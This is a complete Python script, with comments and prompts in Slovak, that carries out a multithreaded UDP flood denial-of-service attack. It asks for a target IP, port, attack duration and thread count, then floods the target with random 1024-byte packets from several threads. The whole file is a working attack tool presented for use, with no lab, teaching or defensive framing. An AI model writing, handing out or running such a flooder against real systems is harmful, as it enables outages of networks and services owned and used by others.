import socket
import threading
import time
import os

# Vyčistenie konzoly
os.system("cls")

def udp_flood(target_ip, target_port, duration):
    """
    Funkcia na vykonanie UDP Flood na cieľové zariadenie.
    :param target_ip: IP adresa cieľa.
    :param target_port: Port cieľa.
    :param duration: Dĺžka útoku v sekundách.
    """
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = os.urandom(1024)  # Náhodný obsah packetu veľkosti 1024 bajtov

    print(f"Začiatok UDP Flood na {target_ip}:{target_port} po dobu {duration} sekúnd...")
    while time.time() < timeout:
        try:
            sock.sendto(packet, (target_ip, target_port))
        except Exception as e:
            print(f"Chyba: {e}")
            break
    sock.close()

# Vstupy od používateľa
target_ip = input("Zadajte IP adresu cieľa: ")
target_port = int(input("Zadajte port cieľa: "))
duration = int(input("Zadajte dĺžku útoku (v sekundách): "))
threads_count = int(input("Zadajte počet vlákien: "))

# Spustenie UDP Flood vo viacerých vláknach
threads = []
for i in range(threads_count):
    thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, duration))
    threads.append(thread)
    thread.start()

# Počkáme na dokončenie všetkých vláken
for thread in threads:
    thread.join()

print("UDP Flood dokončený.")
